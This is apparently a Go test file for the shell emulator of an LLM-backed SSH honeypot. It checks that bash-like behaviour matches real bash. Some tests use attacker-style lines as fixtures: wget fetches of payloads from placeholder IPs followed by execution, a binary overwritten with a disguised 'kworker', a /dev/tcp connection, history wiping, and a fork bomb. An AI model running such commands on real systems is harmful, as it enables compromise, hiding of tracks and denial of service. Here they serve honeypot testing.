package shell

import (
	"bytes"
	"io"
	"strings"
	"testing"
	"time"

	"github.com/amirradjou/llm-honeypot/internal/machine"
	"github.com/amirradjou/llm-honeypot/internal/profile"
)

func testSession(t testing.TB) (*Interp, *Session) {
	t.Helper()
	fixed := time.Date(2026, 9, 17, 12, 0, 0, 0, time.UTC)
	m, err := machine.New(profile.Default(), func() time.Time { return fixed })
	if err != nil {
		t.Fatal(err)
	}
	return New(), NewSession(m, "root", 1)
}

// run executes a line and returns stdout, stderr and status.
func run(t *testing.T, in *Interp, s *Session, line string) (string, string, int) {
	t.Helper()
	var out, errb bytes.Buffer
	status, _, _ := in.Run(s, line, strings.NewReader(""), &out, &errb)
	return out.String(), errb.String(), status
}

func TestEcho(t *testing.T) {
	in, s := testSession(t)
	cases := []struct {
		line, want string
	}{
		{`echo hello world`, "hello world\n"},
		{`echo -n no newline`, "no newline"},
		{`echo -e "tab\there"`, "tab\there\n"},
		{`echo -e 'a\nb'`, "a\nb\n"},
		{`echo -e '\x41\x42'`, "AB\n"},
		{`echo -e '\0101'`, "A\n"},
		{`echo "$HOME"`, "/root\n"},
		{`echo $USER on $HOSTNAME`, "root on srv-web01\n"},
		{`echo`, "\n"},
	}
	for _, c := range cases {
		out, _, st := run(t, in, s, c.line)
		if out != c.want || st != 0 {
			t.Errorf("%q -> %q (status %d), want %q", c.line, out, st, c.want)
		}
	}
}

func TestCdAndPwd(t *testing.T) {
	in, s := testSession(t)
	if out, _, _ := run(t, in, s, "pwd"); out != "/root\n" {
		t.Fatalf("initial pwd = %q", out)
	}
	if _, errb, st := run(t, in, s, "cd /etc/nginx"); st != 0 || errb != "" {
		t.Fatalf("cd: %q status %d", errb, st)
	}
	if out, _, _ := run(t, in, s, "pwd"); out != "/etc/nginx\n" {
		t.Fatalf("pwd after cd = %q", out)
	}
	// cd - goes back.
	run(t, in, s, "cd /tmp")
	run(t, in, s, "cd -") // back to /etc/nginx
	if out, _, _ := run(t, in, s, "pwd"); out != "/etc/nginx\n" {
		t.Fatalf("cd - pwd = %q", out)
	}
	// cd with no arg goes home.
	run(t, in, s, "cd")
	if s.Cwd != "/root" {
		t.Fatalf("cd home = %q", s.Cwd)
	}
	// Errors.
	if _, errb, st := run(t, in, s, "cd /nonexistent"); st == 0 || !strings.Contains(errb, "No such file") {
		t.Errorf("cd missing: %q %d", errb, st)
	}
	if _, errb, st := run(t, in, s, "cd /etc/hostname"); st == 0 || !strings.Contains(errb, "Not a directory") {
		t.Errorf("cd file: %q %d", errb, st)
	}
	// cd through a symlink lands on the real path.
	run(t, in, s, "cd /etc/nginx/sites-enabled")
	if !strings.HasPrefix(s.Cwd, "/etc/nginx/sites-enabled") {
		t.Logf("cwd via symlink = %q", s.Cwd)
	}
}

func TestPrompt(t *testing.T) {
	in, s := testSession(t)
	if s.Prompt() != "root@srv-web01:~# " {
		t.Errorf("prompt = %q", s.Prompt())
	}
	run(t, in, s, "cd /etc")
	if s.Prompt() != "root@srv-web01:/etc# " {
		t.Errorf("prompt = %q", s.Prompt())
	}
	run(t, in, s, "cd /root/scripts")
	if s.Prompt() != "root@srv-web01:~/scripts# " {
		t.Errorf("prompt = %q", s.Prompt())
	}
}

func TestEnvExportUnset(t *testing.T) {
	in, s := testSession(t)
	run(t, in, s, "export FOO=bar")
	if s.Env["FOO"] != "bar" {
		t.Fatal("export failed")
	}
	out, _, _ := run(t, in, s, "echo $FOO")
	if out != "bar\n" {
		t.Errorf("echo $FOO = %q", out)
	}
	// Bare assignment.
	run(t, in, s, "BAZ=qux")
	if s.Env["BAZ"] != "qux" {
		t.Fatal("bare assign failed")
	}
	// Per-command assignment does not persist.
	out, _, _ = run(t, in, s, "TMP=1 printenv TMP")
	if out != "1\n" {
		t.Errorf("per-command env = %q", out)
	}
	if _, ok := s.Env["TMP"]; ok {
		t.Error("per-command assignment leaked into session")
	}
	run(t, in, s, "unset FOO")
	if _, ok := s.Env["FOO"]; ok {
		t.Error("unset failed")
	}
	// env lists sorted.
	out, _, _ = run(t, in, s, "env")
	if !strings.Contains(out, "HOME=/root") || !strings.Contains(out, "PATH=") {
		t.Errorf("env output missing entries:\n%s", out)
	}
}

func TestPipelines(t *testing.T) {
	in, s := testSession(t)
	// Register a couple of helpers to test piping without depending on
	// commands from later commits.
	in.Register("upper", func(c *Context) int {
		b, _ := io.ReadAll(c.Stdin)
		c.Print(strings.ToUpper(string(b)))
		return 0
	})
	in.Register("first", func(c *Context) int {
		b, _ := io.ReadAll(c.Stdin)
		lines := strings.SplitN(string(b), "\n", 2)
		c.Print(lines[0] + "\n")
		return 0
	})
	out, _, _ := run(t, in, s, "echo -e 'one\\ntwo' | upper")
	if out != "ONE\nTWO\n" {
		t.Errorf("pipe = %q", out)
	}
	out, _, _ = run(t, in, s, "echo -e 'a\\nb\\nc' | upper | first")
	if out != "A\n" {
		t.Errorf("three-stage pipe = %q", out)
	}
}

func TestAndOrLists(t *testing.T) {
	in, s := testSession(t)
	// true && echo yes  -> yes
	if out, _, _ := run(t, in, s, "true && echo yes"); out != "yes\n" {
		t.Errorf("&& = %q", out)
	}
	// false && echo no   -> nothing
	if out, _, _ := run(t, in, s, "false && echo no"); out != "" {
		t.Errorf("false && = %q", out)
	}
	// false || echo recover -> recover
	if out, _, _ := run(t, in, s, "false || echo recover"); out != "recover\n" {
		t.Errorf("|| = %q", out)
	}
	// Chaining ; always runs.
	if out, _, _ := run(t, in, s, "false; echo a; echo b"); out != "a\nb\n" {
		t.Errorf("; = %q", out)
	}
	// $? reflects last status.
	run(t, in, s, "false")
	if out, _, _ := run(t, in, s, "echo $?"); out != "1\n" {
		t.Errorf("$? = %q", out)
	}
	run(t, in, s, "true")
	if out, _, _ := run(t, in, s, "echo $?"); out != "0\n" {
		t.Errorf("$? after true = %q", out)
	}
}

func TestRedirectionsToVFS(t *testing.T) {
	in, s := testSession(t)
	run(t, in, s, "cd /tmp")
	if _, errb, st := run(t, in, s, "echo hello > out.txt"); st != 0 || errb != "" {
		t.Fatalf("redirect: %q %d", errb, st)
	}
	data, _, err := s.FS.ReadFile("/tmp/out.txt")
	if err != nil || string(data) != "hello\n" {
		t.Fatalf("file = %q %v", data, err)
	}
	// Append.
	run(t, in, s, "echo world >> out.txt")
	data, _, _ = s.FS.ReadFile("/tmp/out.txt")
	if string(data) != "hello\nworld\n" {
		t.Fatalf("after append = %q", data)
	}
	// Input redirection feeds a pipe consumer.
	in.Register("cat0", func(c *Context) int { b, _ := io.ReadAll(c.Stdin); c.Print(string(b)); return 0 })
	out, _, _ := run(t, in, s, "cat0 < out.txt")
	if out != "hello\nworld\n" {
		t.Errorf("input redirect = %q", out)
	}
	// Truncating overwrite.
	run(t, in, s, "echo fresh > out.txt")
	data, _, _ = s.FS.ReadFile("/tmp/out.txt")
	if string(data) != "fresh\n" {
		t.Errorf("truncate = %q", data)
	}
	// Writing into a missing directory fails like bash.
	if _, errb, st := run(t, in, s, "echo x > /nope/y"); st == 0 || !strings.Contains(errb, "No such file") {
		t.Errorf("bad redirect: %q %d", errb, st)
	}
	// A non-root user cannot redirect into /etc.
	as := NewSession(s.Machine, "martin", 2)
	if _, errb, st := in.Run(as, "echo x > /etc/pwned", strings.NewReader(""), io.Discard, &bytes.Buffer{}); st == 0 {
		_ = errb
		if as.FS.Exists("/etc/pwned") {
			t.Error("martin wrote into /etc")
		}
	}
}

func TestExit(t *testing.T) {
	in, s := testSession(t)
	var out bytes.Buffer
	status, exited, code := in.Run(s, "exit 42", strings.NewReader(""), &out, &out)
	if !exited || code != 42 || status != 42 {
		t.Errorf("exit 42 -> exited=%v code=%d status=%d", exited, code, status)
	}
	// exit with no code uses last status.
	run(t, in, s, "false")
	_, exited, code = in.Run(s, "exit", strings.NewReader(""), &out, &out)
	if !exited || code != 1 {
		t.Errorf("bare exit -> exited=%v code=%d", exited, code)
	}
}

func TestUnknownCommand(t *testing.T) {
	in, s := testSession(t)
	_, errb, st := run(t, in, s, "definitelynotacommand")
	if st != 127 || !strings.Contains(errb, "command not found") {
		t.Errorf("unknown: %q %d", errb, st)
	}
	// A path that does not exist.
	_, errb, st = run(t, in, s, "/usr/local/bin/x")
	if st != 127 || !strings.Contains(errb, "No such file") {
		t.Errorf("missing path: %q %d", errb, st)
	}
	// A system program named by path runs the builtin behind it.
	if out, errb, st := run(t, in, s, "/usr/bin/ls -d /tmp"); st != 0 || out != "/tmp\n" {
		t.Errorf("/usr/bin/ls: %q %q %d", out, errb, st)
	}
	// A downloaded payload "runs" but is not a real program.
	run(t, in, s, "wget -q http://198.51.100.7/x86 -O /tmp/x86; chmod +x /tmp/x86")
	_, errb, st = run(t, in, s, "/tmp/x86")
	if st != 126 || !strings.Contains(errb, "Exec format error") {
		t.Errorf("payload exec: %q %d", errb, st)
	}
	// Fallback is consulted for unknown commands.
	in.Fallback = func(c *Context) (int, bool) {
		c.Print("model says hi\n")
		return 0, true
	}
	out, _, st := run(t, in, s, "somenovelcommand")
	if out != "model says hi\n" || st != 0 {
		t.Errorf("fallback: %q %d", out, st)
	}
}

// shellCase is one line run on a fresh exec-mode session. Expected outputs
// come from bash 5.1 on Ubuntu 22.04 (bash -c, as sshd runs it).
type shellCase struct {
	line, out, err string
	status         int
}

func runCases(t *testing.T, cases []shellCase) {
	t.Helper()
	for _, c := range cases {
		in, s := testSession(t)
		out, errb, st := run(t, in, s, c.line)
		if out != c.out || errb != c.err || st != c.status {
			t.Errorf("%s\n  got  out=%q err=%q status=%d\n  want out=%q err=%q status=%d",
				c.line, out, errb, st, c.out, c.err, c.status)
		}
	}
}

func TestExpansionAtRunTime(t *testing.T) {
	runCases(t, []shellCase{
		{line: `X=1; echo $X`, out: "1\n"},
		{line: `cd /tmp; echo $PWD $OLDPWD`, out: "/tmp /root\n"},
		{line: `X=$(uname -m); echo "arch:$X"`, out: "arch:x86_64\n"},
		{line: "echo $(whoami) `id -u`", out: "root 0\n"},
		{line: "echo `echo \\`echo nested\\``; echo $(echo $(echo deep))", out: "nested\ndeep\n"},
		{line: `echo $(echo a; echo; echo) end`, out: "a end\n"},
		{line: `echo "$(printf 'a\n\n\n')" end`, out: "a end\n"},
		{line: `x="a  b"; echo $x "$x"`, out: "a b a  b\n"},
		{line: `x=$(false); echo $?; echo $(exit 6) $?`, out: "1\n6\n"},
		{line: `echo "$(</etc/hostname)"`, out: "srv-web01\n"},
		{line: `echo ~root ~/x a~b; cd ~; pwd`, out: "/root /root/x a~b\n/root\n"},
		{line: `x=abc.tar.gz; echo ${#x} ${x%.*} ${x%%.*} ${x#*.} ${x##*.} ${x/a/X} ${x//a/X} ${x:1:2} ${x^^}`,
			out: "10 abc.tar abc tar.gz gz Xbc.tar.gz Xbc.tXr.gz bc ABC.TAR.GZ\n"},
		{line: `echo ${y:-def} ${y-def2} ${HOME:+alt} ${y:=set}; echo $y`, out: "def def2 alt set\nset\n"},
		{line: `echo {1..5} {a..c} x{1,2}y {01..03} {5..1..2}`, out: "1 2 3 4 5 a b c x1y x2y 01 02 03 5 3 1\n"},
		{line: `IFS=:; x="a::b"; for i in $x; do echo "[$i]"; done`, out: "[a]\n[]\n[b]\n"},
		{line: `set -- "a b" c; echo $#; for i in "$@"; do echo "<$i>"; done`, out: "2\n<a b>\n<c>\n"},
		{line: `echo "${HOME}" '$HOME' "\$HOME" $'a\tb'`, out: "/root $HOME $HOME a\tb\n"},
		{line: `unset x; echo ${x-unset} ${x:-empty}; x=; echo ${x-unset} ${x:-empty}`, out: "unset empty\nempty\n"},
		{line: `echo ${x:?}; echo after`, err: "bash: line 1: x: parameter null or not set\n", status: 127},
		{line: `echo ${}; echo after`, err: "bash: line 1: ${}: bad substitution\n", status: 1},
	})
}

func TestSpecialParameters(t *testing.T) {
	runCases(t, []shellCase{
		{line: `echo $0 $- $# "$@"`, out: "bash hBc 0\n"},
		{line: `echo $BASH_VERSION $SHLVL $OSTYPE $UID $LINENO`, out: "5.1.16(1)-release 1 linux-gnu 0 1\n"},
		{line: `true & echo $! | grep -c '^[0-9][0-9]*$'`, out: "1\n"},
		{line: `echo $$ | grep -c '^[0-9][0-9]*$'`, out: "1\n"},
		{line: `bash -c 'echo $0 $1 $2' zero one two`, out: "zero one two\n"},
		{line: `sh -c 'echo $0 $-'`, out: "sh\n"},
	})
	in, s := testSession(t)
	s.Interactive = true
	if out, _, _ := run(t, in, s, `echo $0 $-`); out != "-bash himBHs\n" {
		t.Errorf("interactive $0 $- = %q", out)
	}
	if _, errb, st := run(t, in, s, `nosuchcmd`); errb != "-bash: nosuchcmd: command not found\n" || st != 127 {
		t.Errorf("interactive not found: %q %d", errb, st)
	}
}

func TestArithmetic(t *testing.T) {
	runCases(t, []shellCase{
		{line: `echo $((2+3)) $((2**10)) $((7%3)) $((-7/2)) $(( (1+2)*3 )) $((1<2)) $((x=5, x*2)) $((0x10)) $((010)) $((2#101))`,
			out: "5 1024 1 -3 9 1 10 16 8 5\n"},
		{line: `x="1+2"; echo $((x*2)) $((y+1)) $((z))`, out: "6 1 0\n"},
		{line: `echo $((1 ? 2 : 3)) $((0 && 1/0)) $((i++)) $((i)) $((++i)) $(( 3 ** 2 ** 2 ))`, out: "2 0 0 1 2 81\n"},
		{line: `echo $((1/0)); echo after`, err: "bash: line 1: 1/0: division by 0 (error token is \"0\")\n", status: 1},
		{line: `echo $((5/0+1))`, err: "bash: line 1: 5/0+1: division by 0 (error token is \"0+1\")\n", status: 1},
		{line: `echo $((2 + ))`, err: "bash: line 1: 2 + : syntax error: operand expected (error token is \"+ \")\n", status: 1},
		{line: `echo $((08))`, err: "bash: line 1: 08: value too great for base (error token is \"08\")\n", status: 1},
		{line: `((1/0)); echo after $?`, out: "after 1\n", err: "bash: line 1: ((: 1/0: division by 0 (error token is \"0\")\n"},
		{line: `((0)); echo $?; ((5)); echo $?; let x=3+4 y=0; echo $? $x`, out: "1\n0\n1 7\n"},
		{line: `echo $((2**62*4))`, out: "0\n"},
		{line: `echo $((2**1000000000))`, out: "0\n"},
	})
}

func TestRedirectionsAndFds(t *testing.T) {
	runCases(t, []shellCase{
		{line: `ls /nonexistent 2>&1 | head -n 1`, out: "ls: cannot access '/nonexistent': No such file or directory\n"},
		{line: `ls /nonexistent >/dev/null 2>&1 || echo missing`, out: "missing\n"},
		{line: `ls /nonexistent 2>&1 >/dev/null | wc -l`, out: "1\n"},
		{line: `echo error >&2`, err: "error\n"},
		{line: `echo a 1>&2 2>/dev/null`, err: "a\n"},
		{line: `echo x &>/tmp/f; cat /tmp/f; echo y &>>/tmp/f; cat /tmp/f`, out: "x\nx\ny\n"},
		{line: `echo a; { echo b; echo c >&2; } 2>&1 >/dev/null | tr a-z A-Z`, out: "a\nC\n"},
		{line: `{ echo out; echo err >&2; } > /tmp/o 2> /tmp/e; cat /tmp/o /tmp/e`, out: "out\nerr\n"},
		{line: `printf 'a b\nc d\n' > /tmp/i; while read a b; do echo "[$b][$a]"; done < /tmp/i`, out: "[b][a]\n[d][c]\n"},
		{line: `read a b <<< "1 2 3"; echo "$a|$b"`, out: "1|2 3\n"},
		{line: "cat <<EOF\nhello $USER\nEOF\ncat <<'X'\n$HOME\nX", out: "hello root\n$HOME\n"},
		{line: "cat <<EOF", err: "bash: line 1: warning: here-document at line 1 delimited by end-of-file (wanted `EOF')\n"},
		{line: `echo hi > /nope/x; echo $?`, out: "1\n", err: "bash: line 1: /nope/x: No such file or directory\n"},
		{line: `cat < /nope; echo $?`, out: "1\n", err: "bash: line 1: /nope: No such file or directory\n"},
		{line: `echo a >&3; echo $?`, out: "1\n", err: "bash: line 1: 3: Bad file descriptor\n"},
		{line: `exec 3>&1; echo hi >&3; exec 3>&-; echo x >&3; echo $?`, out: "hi\n1\n", err: "bash: line 1: 3: Bad file descriptor\n"},
		{line: `exec 2>/dev/null; ls /nonexistent; echo $?`, out: "2\n"},
		{line: `x="a b"; echo hi > $x`, err: "bash: line 1: $x: ambiguous redirect\n", status: 1},
		{line: `echo hi > /dev/tcp/192.0.2.1/80`, err: "bash: line 1: connect: Connection refused\nbash: line 1: /dev/tcp/192.0.2.1/80: Connection refused\n", status: 1},
		{line: `nohup sleep 0 >/dev/null 2>&1 &`},
	})
}

func TestCompoundCommands(t *testing.T) {
	runCases(t, []shellCase{
		{line: `for i in 1 2 3; do echo $i; done`, out: "1\n2\n3\n"},
		{line: `if [ -d /tmp ]; then echo yes; fi`, out: "yes\n"},
		{line: `if false; then echo a; elif true; then echo b; else echo c; fi`, out: "b\n"},
		{line: `{ echo a; echo b; } | wc -l`, out: "2\n"},
		{line: `for i in 1 2 3; do for j in a b; do [ $j = b ] && continue 2; echo $i$j; done; done`, out: "1a\n2a\n3a\n"},
		{line: `i=0; until [ $i -ge 2 ]; do echo u$i; i=$((i+1)); done; ! false; echo $?`, out: "u0\nu1\n0\n"},
		{line: `i=0; while :; do i=$((i+1)); [ $i -gt 3 ] && break; done; echo $i`, out: "4\n"},
		{line: `case foo in f*) echo match;; *) echo no;; esac`, out: "match\n"},
		{line: `case x in a|x) echo one;& b) echo two;; c) echo three;; esac`, out: "one\ntwo\n"},
		{line: `cd /tmp; X=1; (cd /; X=2; echo $PWD $X); echo $PWD $X`, out: "/ 2\n/tmp 1\n"},
		{line: `for ((i=0; i<3; i++)); do echo $i; done`, out: "0\n1\n2\n"},
		{line: `[[ -d /tmp && $HOME == /r* ]] && echo yes; [[ abc =~ ^a.c$ ]] && echo re; [[ 10 -gt 9 ]] && echo num`, out: "yes\nre\nnum\n"},
		{line: `echo hi | exit 3; echo $?`, out: "3\n"},
		{line: `(exit 5); echo $?`, out: "5\n"},
		{line: `f(){ echo "args: $# $1"; return 3; }; f a "b c"; echo $?`, out: "args: 2 a\n3\n"},
		{line: `a=1; f() { local a=2; echo $a; }; f; echo $a`, out: "2\n1\n"},
		{line: `echo a b c | { read x y; echo $y; }`, out: "b c\n"},
		{line: `echo x | read v; echo "[$v]"`, out: "[]\n"},
		{line: `false || { echo recovered; true; } && echo ok`, out: "recovered\nok\n"},
		{line: "for i in 1 2\ndo\n  echo $i\ndone", out: "1\n2\n"},
	})
}

func TestSyntaxErrorsLikeBash(t *testing.T) {
	runCases(t, []shellCase{
		{line: `if true; then echo a`, err: "bash: -c: line 2: syntax error: unexpected end of file\n", status: 2},
		{line: `echo a; fi; echo b`, err: "bash: -c: line 1: syntax error near unexpected token `fi'\nbash: -c: line 1: `echo a; fi; echo b'\n", status: 2},
		{line: `echo "abc`, err: "bash: -c: line 1: unexpected EOF while looking for matching `\"'\nbash: -c: line 2: syntax error: unexpected end of file\n", status: 2},
		{line: `for i in 1 2; echo $i; done`, err: "bash: -c: line 1: syntax error near unexpected token `echo'\nbash: -c: line 1: `for i in 1 2; echo $i; done'\n", status: 2},
		{line: "echo one\nfi", out: "one\n", err: "bash: -c: line 2: syntax error near unexpected token `fi'\nbash: -c: line 2: `fi'\n", status: 2},
		{line: `sh -c 'if true; then'; echo st=$?`, out: "st=2\n", err: "sh: 1: Syntax error: end of file unexpected (expecting \"fi\")\n"},
	})
}

func TestBuiltinsForTheShell(t *testing.T) {
	runCases(t, []shellCase{
		{line: `type cd ls if foo; echo $?`, out: "cd is a shell builtin\nls is /usr/bin/ls\nif is a shell keyword\n1\n", err: "bash: line 1: type: foo: not found\n"},
		{line: `ls >/dev/null; type ls`, out: "ls is hashed (/usr/bin/ls)\n"},
		{line: `command -v cd ls if foo; echo $?`, out: "cd\n/usr/bin/ls\nif\n0\n"},
		{line: `command -v wget; command -v nosuch; echo $?`, out: "/usr/bin/wget\n1\n"},
		{line: `command ls -d /tmp; command foo; echo $?`, out: "/tmp\n127\n", err: "bash: line 1: foo: command not found\n"},
		{line: `enable | head -3; enable cd; echo $?; enable foo; echo $?`, out: "enable .\nenable :\nenable [\n0\n1\n", err: "bash: line 1: enable: foo: not a shell builtin\n"},
		{line: `ulimit -n; ulimit -n 4096; ulimit -n; ulimit; ulimit -a | head -2`,
			out: "1024\n4096\nunlimited\nreal-time non-blocking time  (microseconds, -R) unlimited\ncore file size              (blocks, -c) 0\n"},
		{line: `eval 'echo $((1+1))'; eval "x=5"; echo $x`, out: "2\n5\n"},
		{line: `printf 'echo src $1\nreturn 4\necho no\n' > /tmp/r.sh; . /tmp/r.sh arg; echo st=$?`, out: "src arg\nst=4\n"},
		{line: `printf 'echo one\nexit 7\necho no\n' > /tmp/t.sh; chmod +x /tmp/t.sh; /tmp/t.sh; echo st=$?`, out: "one\nst=7\n"},
		{line: `printf 'echo one\nfoo\necho $0 $1\nif\n' > /tmp/s.sh; sh /tmp/s.sh x; echo st=$?; bash /tmp/s.sh y; echo st=$?`,
			out: "one\n/tmp/s.sh x\nst=2\none\n/tmp/s.sh y\nst=2\n",
			err: "/tmp/s.sh: 2: foo: not found\n/tmp/s.sh: 5: Syntax error: end of file unexpected (expecting \"then\")\n" +
				"/tmp/s.sh: line 2: foo: command not found\n/tmp/s.sh: line 5: syntax error: unexpected end of file\n"},
		{line: `sh -c 'foo; echo $((1/0)); echo after'; echo st=$?`, out: "st=2\n",
			err: "sh: 1: foo: not found\nsh: 1: arithmetic expression: division by zero: \"1/0\"\n"},
		{line: `set -- a b c; shift 2; echo $1 $#; shift 5; echo $?`, out: "c 1\n1\n"},
		{line: `x=5; readonly y=6; declare z=7; echo $x $y $z`, out: "5 6 7\n"},
		{line: `history -c; unset HISTFILE; export HISTFILE=/dev/null; echo ok`, out: "ok\n"},
		{line: `exec echo replaced; echo never`, out: "replaced\n"},
		{line: `break; echo $?`, out: "0\n", err: "bash: line 1: break: only meaningful in a `for', `while', or `until' loop\n"},
		{line: `local x=1`, err: "bash: line 1: local: can only be used in a function\n", status: 1},
	})
}

func TestPathDispatch(t *testing.T) {
	runCases(t, []shellCase{
		{line: `/bin/ls -d /tmp`, out: "/tmp\n"},
		{line: `/usr/bin/id -u`, out: "0\n"},
		{line: `/bin/sh -c 'echo $0'`, out: "/bin/sh\n"},
		{line: `/bin/foo; ./x; echo $?`, out: "127\n", err: "bash: line 1: /bin/foo: No such file or directory\nbash: line 1: ./x: No such file or directory\n"},
		{line: `/tmp`, err: "bash: line 1: /tmp: Is a directory\n", status: 126},
		{line: `echo hi > /tmp/n; /tmp/n`, err: "bash: line 1: /tmp/n: Permission denied\n", status: 126},
		{line: `cd /tmp; wget -q http://192.0.2.10/x; chmod +x x; ./x`, err: "bash: line 1: ./x: cannot execute binary file: Exec format error\n", status: 126},
		// A payload copied over a system binary is no longer that program.
		{line: `wget -q http://192.0.2.10/x -O /usr/bin/id; /usr/bin/id`, err: "bash: line 1: /usr/bin/id: cannot execute binary file: Exec format error\n", status: 126},
		// So is one dropped on the PATH under a new name.
		{line: `wget -q http://192.0.2.10/x -O /usr/local/bin/kworker; chmod +x /usr/local/bin/kworker; kworker`,
			err: "bash: line 1: kworker: cannot execute binary file: Exec format error\n", status: 126},
		// sh and bash on a payload run it silently (nothing a shell could do).
		{line: `cd /tmp; wget -q http://192.0.2.10/bins.sh; chmod 777 bins.sh; sh bins.sh; echo st=$?; bash bins.sh; echo st=$?; . ./bins.sh; echo st=$?`,
			out: "st=0\nst=0\nst=0\n"},
		{line: `sh /nope.sh; echo $?; bash /nope.sh; echo $?`, out: "2\n127\n",
			err: "sh: 0: cannot open /nope.sh: No such file\nbash: /nope.sh: No such file or directory\n"},
	})
}

func TestStdinScriptForSh(t *testing.T) {
	in, s := testSession(t)
	var out, errb bytes.Buffer
	status, _, _ := in.Run(s, "sh", strings.NewReader("echo from-stdin\nX=1; echo $X\n"), &out, &errb)
	if out.String() != "from-stdin\n1\n" || status != 0 {
		t.Errorf("sh < script: %q %q %d", out.String(), errb.String(), status)
	}
}

// Attacker input must never hang or exhaust the honeypot.
func TestHostileLinesComeBackPromptly(t *testing.T) {
	cases := []struct {
		line   string
		status int
		errHas string
	}{
		{line: `while true; do :; done; echo never`, status: 1},
		{line: `for ((;;)); do echo x; done`, status: 1},
		{line: `:(){ :|:& };:`, status: 254, errHas: "fork: Resource temporarily unavailable"},
		{line: `f(){ f; }; f`, status: 139},
		{line: `x='eval "$x"'; eval "$x"`, status: 139},
		{line: `echo 'sh /tmp/r.sh' > /tmp/r.sh; sh /tmp/r.sh`, status: 139},
		{line: `echo 'echo /tmp/q.sh | xargs sh' > /tmp/q.sh; sh /tmp/q.sh`, status: 139},
		{line: `echo $(yes) | wc -c`},
		{line: `echo {1..100000000} | wc -c`},
		{line: `echo {a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b} | wc -c`},
		{line: `while :; do cat /usr/bin/python3.10 >> /tmp/big; done`, status: 1},
		{line: strings.Repeat("$(", 200) + strings.Repeat(")", 200), status: 2},
	}
	for _, c := range cases {
		in, s := testSession(t)
		start := time.Now()
		_, errb, st := run(t, in, s, c.line)
		if d := time.Since(start); d > 5*time.Second {
			t.Errorf("%.40q took %v", c.line, d)
		}
		if st != c.status || !strings.Contains(errb, c.errHas) {
			t.Errorf("%.40q -> status %d, stderr %.200q", c.line, st, errb)
		}
		if info, err := s.FS.Stat("/tmp/big"); err == nil && info.Size > maxFileWrite {
			t.Errorf("redirected %d bytes in one line", info.Size)
		}
	}
}
